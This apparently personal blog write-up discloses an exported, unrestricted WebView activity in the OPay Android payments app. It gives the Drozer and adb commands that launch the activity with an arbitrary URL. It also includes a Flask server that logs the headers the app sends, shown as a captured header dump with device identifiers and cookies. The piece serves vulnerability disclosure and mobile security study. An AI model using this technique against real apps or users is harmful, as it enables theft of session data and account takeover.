# Introduction
Past year i discovered an insecure permissions on one of the online payments applications `Opay` and this bug affected the implemented `WebView` in the application . Let's go a head and explain it all.

# Spotting the bug
We will start with the `Opay` application information:
```
Name: OPay
Package Name: team.opay.pay.egypt
Version: 1.10.1.44
```

After we install the app. We will need [Drozer](https://labs.withsecure.com/tools/drozer) framework, Also we will need the [Drozer Agent](https://github.com/mwrlabs/drozer/releases/download/2.3.4/drozer-agent-2.3.4.apk) to install on the `Emulator` (Thats what i am using currently) or `Device` and connect to the agent. Therefor, we will be able to test it and reproduce the bug.	

Note: `You may face problem with python2 packages. So, you can download all of it as deb packages and install it`

When we install the agent click on the `OFF` button to turn it on `ON`:
![959ea2efb6787e036e84c36e898fd810.png](../_resources/959ea2efb6787e036e84c36e898fd810.png)

As you can see the agent is running on port `31415`. Now, using `adb` tools we will do port forward for any connections come on `31415` to our `Emulator` on `31415` which is the agent port.
Command: `adb forward tcp:31415 tcp:31415`
![a12bede193bd9905ef91aad4718110c8.png](../_resources/a12bede193bd9905ef91aad4718110c8.png)

- Note: `If you are on windowes you could WSL`

Now, time to use `drozer` using the following command `drozer console connect` to connect to our agent and by default it will connect lcoally on port `31415`. If you will connect on any other IP address use `--server IP:port`.

![7629800189571a751626898e6abfdae8.png](../_resources/7629800189571a751626898e6abfdae8.png)

By running the following module `run app.package.list` we will list all installed packages `apps` on the device and you can see `Opay` package `team.opay.pay.egypt`:

![c3993193b6ed44b404527a0744f0daac.png](../_resources/c3993193b6ed44b404527a0744f0daac.png)

Next, As we have the package name we can start perform our test on it. we will be usin g the following modules:
- `app.package.info`: List package information.
- `app.package.attacksurface`: List package components.
- `app.activity.info`: List activities in the app with permissions.

Now, Let's use the first module to list the package information:
- `-a`: is to spesify a package

![63ffcef63bbaf553a24f027b7e4aa7b1.png](../_resources/63ffcef63bbaf553a24f027b7e4aa7b1.png)

In the screenshot we can see the application permissions, version, Name, etc. For now the important thing for us is `Data Directory` we will need it later.

`app.package.attacksurface` module:

![a2740e9989b852396bb9e69967daa4b7.png](../_resources/a2740e9989b852396bb9e69967daa4b7.png)

We can see that we have `30` exported activities, `1` exported broadcast receviers and `2` exported services. As the bug in the implemented `Webview` activity component. We will move on with the `app.activity.info` module:

![d1cf47a009f4ac8b27dc3affefb72153.png](../_resources/d1cf47a009f4ac8b27dc3affefb72153.png)

As we can notice clearly here that the `Webview` activity has value of `null` permissions and it's exported thats mean we can exploit it using the `app.activity.start` module we can start activites and also pass a `URI` to get parsed and launch it through the activity. 

- Command: `run app.activity.start --component <package> <activity> --data-uri <url>`

![408b3232763182aa934e741dc3f9d88e.png](../_resources/408b3232763182aa934e741dc3f9d88e.png)

As you can see it started the activity and loading `google` website. If we take a look on the following `URL` and click on it from the message:

![d8608a4be414959b61f5a21d4889c3fc.png](../_resources/d8608a4be414959b61f5a21d4889c3fc.png)![76d4f5a8d931542e16843b40bb8cabc1.png](../_resources/76d4f5a8d931542e16843b40bb8cabc1.png)

We can see the `Opay` application poped-up when we clicked the `URL`. Therefor, we can use the `WebView` of `Opay` application. But, why this happen ? and Why it can be harmful ?.

## Why this happen ?
If we decompile the app with `apktool` or `jadx` and even through `app.package.manifest` module in `Drozer`. We can access the `AndroidManifest.xml` file. If we go through the code for a while on the following lines we can see our activity:

```
<activity theme="@2131886089"
              name="com.opay.webview.WebFoundationActivity"
              screenOrientation="1">
      <intent-filter>
        <action name="android.intent.action.VIEW">
        </action>
        <category name="android.intent.category.DEFAULT">
        </category>
        <data scheme="http">
        </data>
        <data scheme="https">
        </data>
      </intent-filter>
    </activity>
```

The above code is defining an `activity` and inside it you can see the `<data>` element which used in the `AndroidManifest.xml` file to specify a data `URI` that an activity, service, or broadcast receiver can handle. It's handling the `URI` with these scheme `http`,`https`. But, the developer forgot to specify the trusted hosts also. Therefor, the activity will be launched with any host.

## Why it can be harmful ?
You may now wondering why using a `WebView` or an activity in another app would be result in harmful impact. So, basically if we created a simple `HTTP` server and each time a user visit our `HTTP` server we will print the USER's Headers. Here i used a simple `Flask` app: ![6956c1366f205859d7d57a3dd81cdb7f.png](../_resources/6956c1366f205859d7d57a3dd81cdb7f.png)

- Flask code:
```
from flask import Flask, request

app = Flask(__name__)

# End point and request methods
@app.route("/", methods=["POST", "GET"])
def index():
    # Print the request headers
    print(request.headers)

		# Print hello world in the page
    return "Hello, World!"

if __name__ == "__main__":
    # Run the app
    app.run(host="192.168.0.143")# host to listen on
```

Now, Let's pass our `URL` to the activity:

![51a82d287695ff98df529c82b261edee.png](../_resources/51a82d287695ff98df529c82b261edee.png)

On the right you can see our `Emulator` and the `Opay` application opened & our web sever on the activity. On the left you can see our `Console` and the `Opay` user headers printed as a result of visiting our web server.

- Headers:
```
Host: 192.168.0.143:5000
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 7.1.1; Android SDK built for x86_64 Build/NYC; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.100 Mobile Safari/537.36
Role: 
Gender: 
Isroot: true
Versionname: 1.10.1.44
Versioncode: 1089552
Gaid: 
Latitude: 0.0
Longitude: 0.0
Language: en
Mcc: 310260
Deviceid: 210515E35F2DBD8DFF2C75B2263BA9F6
Platform: Android
Uid: 
Appid: 12
Countrycode: EG
Localcode: EG
Cityname: 
Model: Android SDK built for x86_64
Brand: Android
Isvirtualdevice: true
Traceid: c0b84f03-67a5-4f9a-a549-f1112c0ffc57
Os: 7.1.1
Appname: OPay
Avatar: 
Token: 
Appsflyerid: 1671626263427-3017340608479234332
Iswifi: true
Phone: 
Name: 
Mediasource: organic
Campaign: 
Dma: unknown
Getblackbox: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-EG,en-US;q=0.8
Cookie: fromWhere=AndroidClient; commonParams={"gaid":"","appId":"12","appName":"OPay","appsFlyerId":"1671626263427-3017340608479234332","avatar":"","brand":"Android","campaign":"","cityId":"","countryCode":"EG","deviceId":"210515E35F2DBD8DFF2C75B2263BA9F6","dma":"unknown","email":"","gender":"","getBlackbox":"","ipAddress":"","isRoot":true,"isVirtualDevice":true,"isWifi":true,"language":"en","latitude":0.0,"localCode":"EG","longitude":0.0,"mcc":"310260","mediaSource":"organic","model":"Android SDK built for x86_64","name":"","os":"7.1.1","phone":"","platform":"Android","role":"","screenResolution":"1440x2712","token":"","traceId":"c0b84f03-67a5-4f9a-a549-f1112c0ffc57","uid":"","versionCode":1089552,"versionName":"1.10.1.44"}
X-Requested-With: team.opay.pay.egypt
```

In the above headers you can see a lot of sensitive headers that carry a sensitive informations like Phone number, Name, Cookies, Token and inside `Cookies` you can see that there are more other information. So, as impact this will result in taking over users account and inside these account we have `CC`,`Payments History`, `Services` and many more. To make it more clear let's login and explore the app.

## Exploring the app
I used the new version of the app at the moment as the old version didn't work with me.

As you can see we have a lot of services here that we can use to pay for `Bills` or any other `Living Services`.

![dabb71260e005f4f0a6d7ca2785bbf0d.png](../_resources/dabb71260e005f4f0a6d7ca2785bbf0d.png)

And as we know when a threat actor access your account can easlly pay for himself through mobile services and get it in cash by doing money laundry into many ways.

Now, let's go to `My Opay` tab. We can see a lot of options on the list like the transctions and bank cards:

![49d64bc8ceb79c6bf8cec537c4aa81ae.png](../_resources/49d64bc8ceb79c6bf8cec537c4aa81ae.png)

- Transactions:
![539b500e7cc8650a043f5e5d91ac6b3c.png](../_resources/539b500e7cc8650a043f5e5d91ac6b3c.png)

- Bank Cards:
![bf9d82454d6ee79bfa494692e09c9632.png](../_resources/bf9d82454d6ee79bfa494692e09c9632.png)

So, to access these activities most of it loading `URLs` into the `WbView` and send the request along with the `Headers` like Toekns, identifiers, etc.


# Conclusion
At the end, the last update from the app is patched. But, after i tested the new app still there some other vulnerabilities. The best soltuion here is to click wisely on what app do you use to open your non-trusted `URLS`. 